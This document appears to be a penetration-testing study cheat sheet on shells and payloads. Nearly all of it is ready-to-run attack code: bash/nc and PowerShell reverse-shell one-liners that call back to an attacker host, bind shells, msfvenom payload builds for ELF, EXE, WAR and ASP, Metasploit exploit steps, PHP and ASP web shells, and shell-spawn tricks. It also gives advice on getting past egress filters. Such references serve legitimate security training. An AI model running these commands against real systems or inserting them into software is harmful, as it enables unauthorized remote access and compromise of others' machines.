# Shells & Payloads Cheat Sheet

Flat copy-paste reference (explanations in `08-shells-payloads/README.md`).
Placeholders: `<TARGET_IP>`, `<LHOST>`, `<PORT>`, `<USER>`, `<PASS>`.

## Listeners (attack box)
```bash
sudo nc -lvnp <PORT>                      # catch a reverse shell (use 443 — looks like HTTPS, rarely blocked out)
# msfconsole → use multi/handler ; set PAYLOAD ... ; set LHOST/LPORT ; run    (for meterpreter)
```

## Reverse shells
```bash
# Linux bash/nc one-liner (on target):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> <PORT> > /tmp/f
```
```powershell
# Windows PowerShell reverse shell (native — no nc needed):
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# nishang: Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <PORT>
```
One-liners for any language: **revshells.com**, PayloadsAllTheThings/Reverse-Shell-Cheat-Sheet.

## Bind shell (target listens, you connect in)
```bash
# target:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > /tmp/f
# attacker:
nc -nv <TARGET_IP> <PORT>
```

## Payload generation (msfvenom)
```bash
msfvenom -l payloads                                                         # list all
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=<LHOST> LPORT=<PORT> -f elf  > x.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<PORT> -f exe  > x.exe
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<LHOST> LPORT=<PORT> -f war  > x.war   # Tomcat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<PORT> -f asp > x.asp
```
Staged = `shell/reverse_tcp` (small stage calls back for the rest). Stageless = `shell_reverse_tcp` (whole payload at once — better on bad links / for evasion). Catch meterpreter with `multi/handler`.

## Metasploit flow
```text
sudo msfconsole
search <service> ; use <module>              # e.g. exploit/windows/smb/ms17_010_psexec
options ; set RHOSTS <TARGET_IP> ; set LHOST <LHOST> ; set LPORT <PORT>
exploit                                       # → Meterpreter → `shell` drops to native shell
```

## Web shells
```php
<?php system($_REQUEST['cmd']); ?>            // shell.php → /uploads/shell.php?cmd=id
<% eval request('cmd') %>                     // ASP/.NET
```
Laudanum `/usr/share/laudanum/` (edit allowedIps) · Antak `/usr/share/nishang/Antak-WebShell/antak.aspx` (set user/pass) · phpbash. Use a web shell to pull a reverse shell, then delete it.

## TTY upgrade (do immediately after catching a shell)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # step 1
# Ctrl+Z
stty raw -echo; fg                                 # step 2
export TERM=xterm                                  # step 3
stty rows 38 columns 116                           # match your terminal (get size with `stty size`)
# fallbacks: script -qc /bin/bash /dev/null ; /bin/sh -i ; perl -e 'exec "/bin/sh";'
```

## Local shell spawn (limited exec / SUID — GTFOBins)
```bash
/bin/sh -i ; python3 -c 'import pty;pty.spawn("/bin/sh")'
awk 'BEGIN{system("/bin/sh")}' ; perl -e 'exec "/bin/sh";'
find . -exec /bin/sh \; -quit ; vim -c ':!/bin/sh'
```

> Reverse shell on port 443 beats most egress filters; bind shells are easier for a firewall to block. First move after catching a shell: upgrade the TTY. Prefer a reverse shell over relying on a web shell; document payload names + hashes + paths.
